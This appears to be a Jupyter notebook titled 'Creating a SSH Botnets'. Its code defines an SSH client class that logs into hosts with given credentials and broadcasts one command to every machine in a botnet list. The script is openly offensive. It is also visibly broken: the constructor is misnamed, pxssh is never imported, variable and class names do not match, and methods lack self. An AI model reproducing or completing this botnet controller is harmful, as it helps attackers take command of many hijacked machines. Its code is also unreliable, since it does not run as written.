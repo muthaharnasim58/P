{
  "metadata": {
    "kernelspec": {
      "name": "python",
      "display_name": "Python (Pyodide)",
      "language": "python"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "python",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.8"
    }
  },
  "nbformat_minor": 4,
  "nbformat": 4,
  "cells": [
    {
      "cell_type": "code",
      "source": "#Creating a SSH Botnets ",
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "execution_count": 4
    },
    {
      "cell_type": "code",
      "source": "import os\nimport optparse",
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "execution_count": 13
    },
    {
      "cell_type": "code",
      "source": "class client:\n    \n    def _init_(self, host, user, password):\n        self.user = user\n        self.host = host\n        self.password = password\n        self.session = self.connect()\n\n    def connect(self):\n        try:\n            s = pxssh.pxssh()\n            s.login(self.host, self.user, self.password)\n            return s\n        except Exception as e:\n            print(e)\n\n\n    def send_command(self, cmd):\n        self.session.sendline(cmd)\n        self.session.prompt()\n        return self.session.before\n\n\n    def botnet_command(command):\n        for client in Botnet:\n            output = client.send_command(command)\n            print('[*] Output from ' + client.host)\n\n    def add_client(host, user, password):\n        client = Client(host, user, password)\n        botnet.append(client)\n\nbotnet = []\norder = input(\"Command >> \")\n",
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "execution_count": 26
    }
  ]
}